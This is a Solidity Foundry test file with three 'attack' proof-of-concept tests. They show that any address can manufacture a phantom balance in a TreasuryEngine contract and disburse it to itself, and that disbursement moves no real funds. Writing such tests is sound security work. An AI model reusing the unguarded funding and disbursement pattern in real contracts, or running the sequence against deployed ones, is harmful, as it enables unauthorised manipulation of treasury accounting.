// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {TreasuryEngine} from "../../../src/economics/TreasuryEngine.sol";

contract Attack_TreasuryAccountingSpoofTest is Test {
    TreasuryEngine internal treasury;

    address internal attacker = address(0xBEEF);
    address internal victim = address(0xCAFE);

    function setUp() public {
        treasury = new TreasuryEngine();
    }

    function test_Attack_AnyoneCanManufactureTreasuryBalance() public {
        vm.prank(attacker);

        treasury.fundTreasury(1_000_000 ether);

        (,, uint256 balance) = treasury.getTreasuryState();

        assertEq(balance, 1_000_000 ether, "Expected permissionless phantom treasury balance");
    }

    function test_Attack_AnyoneCanDisburseManufacturedTreasuryBalance() public {
        vm.startPrank(attacker);

        treasury.fundTreasury(1_000_000 ether);
        treasury.disburseFunds(attacker, 1_000_000 ether);

        vm.stopPrank();

        (,, uint256 balance) = treasury.getTreasuryState();

        assertEq(balance, 0, "Manufactured treasury balance should have been consumed");
    }

    function test_Attack_DisbursementDoesNotMoveRealFunds() public {
        vm.startPrank(attacker);

        treasury.fundTreasury(100 ether);

        uint256 attackerBefore = attacker.balance;

        treasury.disburseFunds(attacker, 100 ether);

        uint256 attackerAfter = attacker.balance;

        vm.stopPrank();

        assertEq(attackerAfter, attackerBefore, "TreasuryEngine currently performs no real asset transfer");
    }
}
